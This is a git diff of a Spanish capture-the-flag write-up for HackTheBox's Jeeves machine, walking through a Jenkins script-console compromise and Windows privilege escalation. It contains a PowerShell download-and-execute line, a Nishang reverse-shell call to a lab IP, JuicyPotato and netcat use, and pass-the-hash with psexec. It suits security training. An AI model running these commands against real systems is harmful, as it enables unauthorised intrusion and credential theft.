@@ -1,19 +1,66 @@
-# Estadísticas
+---
+tags:
+  - Jenkins Exploitation (Groovy Script Console)
+  - Abusing SeImpersonatePrivilege
+  - PassTheHash (Psexec)
+  - Breaking KeePass
+  - Alternate Data Streams (ADS)
+---
+
+# Jeeves <!-- omit from toc -->
+
+Write-up de la máquina Jeeves de [HackTheBox](https://hackthebox.com).
+
+![Cover de Jeeves](images/cover.png)
+
+## Índice <!-- omit from toc -->
+
+- [Introducción](#introducción)
+  - [Estadísticas](#estadísticas)
+- [Reconocimiento](#reconocimiento)
+  - [Escaneo de host](#escaneo-de-host)
+    - [Escaneo completo de puertos](#escaneo-completo-de-puertos)
+    - [Escaneo específico](#escaneo-específico)
+- [Enumeración](#enumeración)
+  - [Servicios](#servicios)
+    - [http - 80](#http---80)
+    - [http - 50000](#http---50000)
+      - [Manual](#manual)
+      - [ffuf](#ffuf)
+- [Explotación](#explotación)
+  - [RCE 1](#rce-1)
+    - [Pasos previos | Preparación](#pasos-previos--preparación)
+    - [Ejecución](#ejecución)
+  - [RCE 2](#rce-2)
+    - [Pasos previos | Preparación](#pasos-previos--preparación-1)
+    - [Ejecución](#ejecución-1)
+- [Post Explotación](#post-explotación)
+  - [Enumeración](#enumeración-1)
+  - [Escalación de privilegios](#escalación-de-privilegios)
+    - [kohsuke → nt authority\\system](#kohsuke--nt-authoritysystem)
+      - [JuicyPotato](#juicypotato)
+      - [KeePass](#keepass)
+      - [Obtención de bandera](#obtención-de-bandera)
+- [Referencias](#referencias)
+
+## Introducción
+
+### Estadísticas
 
 | Característica | Descripción |
 |---|---|
-| Nombre | [Jeeves](https://www.hackthebox.com/home/machines/profile/114) |
+| Nombre | [Jeeves](https://app.hackthebox.com/machines/Jeeves) |
 | OS | Windows |
 | Dificultad oficial | Medium |
-| Dificultad de comunidad | ![Dificultad](images/difficulty.png) |
+| Dificultad de comunidad | ![Dificultad](images/diff.png) |
 | Puntos | 30 |
-| Creadores | [mrb3n](https://www.hackthebox.com/home/users/profile/2984) |
+| Creadores | [mrb3n](https://app.hackthebox.com/users/2984) |
 
-# Reconocimiento
+## Reconocimiento
 
-## Escaneo de host
+### Escaneo de host
 
-### Escaneo completo de puertos
+#### Escaneo completo de puertos
 
 ```bash
 └─$ nmap -T5 -vvv -open -p- -n -Pn -oG nmap/all_ports $TARGET
@@ -42,7 +89,7 @@ Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 97.32 seconds
 ```
 
-### Escaneo específico
+#### Escaneo específico
 
 ```bash
 └─$ nmap -sCV -p 80,135,445,50000 -n -Pn -oN nmap/targeted $TARGET
@@ -81,11 +128,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 47.15 seconds
 ```
 
-# Enumeración
+## Enumeración
 
-## Servicios
+### Servicios
 
-### http - 80
+#### http - 80
 
 Se presenta en el sitio web un formulario con un input el cual al realizar el submit se redirige a `error.html` que presenta un imagen relacionada al tipo de error que arroja un IIS. Dado que está hardcodeada la redireccion no se intentó nada al respecto.
 
@@ -93,15 +140,15 @@ Se presenta en el sitio web un formulario con un input el cual al realizar el su
 
 Por otro lado, también se buscó fuzzear directorios mediante `ffuf`, sin tener éxito mostrando sólo las rutas con las anteriormente se había interactuado.
 
-### http - 50000
+#### http - 50000
 
-#### Manual
+##### Manual
 
 Se hace la omisión de los puertos en los cuales no se encontró información que pudiera resultar útil, sin embargo, en este puerto es mostrado un error genérico del servidor Jetty exponiendo en primera instancia la versión que se está ejecutando. Después de buscar [vulnerabilidades relacionadas](https://www.cvedetails.com/product/34824/Eclipse-Jetty.html?vendor_id=10410) e intentar explotarlas se decidió no darle seguimiento dado que en este punto se había visualizado una ruta expuesta en la ejecución de `ffuf`.
 
 ![Error de Jetty](images/enum_2.png)
 
-#### ffuf
+##### ffuf
 
 Después de casi completar el diccionario que por lo regular se usa, se identificó la ruta `askjeeves` mediante:
 
@@ -115,11 +162,11 @@ Por lo que al navegar a esta se identificó la disponibilidad de un servidor Jen
 
 ![Servidor Jenkins disponible](images/enum_4.png)
 
-# Explotación
+## Explotación
 
-## RCE 1
+### RCE 1
 
-### Pasos previos | Preparación
+#### Pasos previos | Preparación
 
 Jenkins ofrece una consola de scripts siguiendo la sintáxis de Groovy, disponible en `Build Executor Status > master > Script Console`.
 
@@ -131,7 +178,7 @@ Al visualizar la sintáxis necesaria para ejecutar comandos de consola expuesta 
 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.16 -Port 443
 ```
 
-### Ejecución
+#### Ejecución
 
 Se envió la invocación al recurso expuesto mediante la consola de scripts:
 
@@ -143,9 +190,9 @@ Estableciendo así la reverse shell.
 
 ![Reverse shell establecida](images/exploit_2.png)
 
-## RCE 2
+### RCE 2
 
-### Pasos previos | Preparación
+#### Pasos previos | Preparación
 
 Igualmente se pueden ejecutar comandos directamente en la máquina mediante la creación de un nuevo item `Create New Item > Freestyle Project > Build > Execute Windows batch command`, guardando en el campo de texto el comando a ejecutar:
 
@@ -155,19 +202,19 @@ powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16/
 
 ![Comando a ejecutar](images/exploit_3.png)
 
-### Ejecución
+#### Ejecución
 
 Restando sólo guardar el proceso en la plataforma y ejecutarlo (`Save > Build Now`). Teniendo de esta forma otra manera de ejecutar comandos a través de Jenkins.
 
 ![Ejecutando el item creado](images/exploit_4.png)
 
-# Post Explotación
+## Post Explotación
 
-## Enumeración
+### Enumeración
 
 Al ejecutar:
 
-```
+```powershell
 whoami /all
 ```
 
@@ -179,11 +226,11 @@ Además, se identificó una base de datos de KeePass `CEH.kdbx` en el directorio
 
 ![Base de datos de KeePass](images/post_2.png)
 
-## Escalación de privilegios
+### Escalación de privilegios
 
-### kohsuke &rarr; nt authority\system
+#### kohsuke &rarr; nt authority\system
 
-#### JuicyPotato
+##### JuicyPotato
 
 Al cargar previamente el binario de netcat y ejecutar el binario de JuicyPotato se obtuvo una reverse shell como `nt authority\system` mediante:
 
@@ -196,7 +243,7 @@ Al cargar previamente el binario de netcat y ejecutar el binario de JuicyPotato 
 1. Ejecución de JuicyPotato.
 2. Otención de reverse shell.
 
-#### KeePass
+##### KeePass
 
 Se extrajo la base de datos de KeePass haciendo uso de la utilería de [impacket](https://github.com/SecureAuthCorp/impacket), mediante:
 
@@ -234,7 +281,7 @@ Debido a que la primera mitad corresponde al identificador de la máquina y la s
 
 ![Acceso mediante hash](images/post_6.png)
 
-#### Obtención de bandera
+##### Obtención de bandera
 
 Después de buscar extraer el contenido de la bandera, se encontró el archivo `hm.txt` el cuál indica que la bandera no se encuentra presente si no en otro sitio. Durante ese proceso se encontró información referente a los [Alternate Data Streams](https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/) que básicamente son una forma de ocultar información en un archivo y la característica existe únicamente en sistemas de archivos de tipo NTFS.
 
@@ -254,7 +301,7 @@ powershell.exe get-content -path .\hm.txt -stream root.txt
 
 ![Extracción de data streams](images/post_8.png)
 
-# Referencias
+## Referencias
 
 - [CVE Details - Jetty](https://www.cvedetails.com/product/34824/Eclipse-Jetty.html?vendor_id=10410).
 - [Github - Nishang](https://github.com/samratashok/nishang).
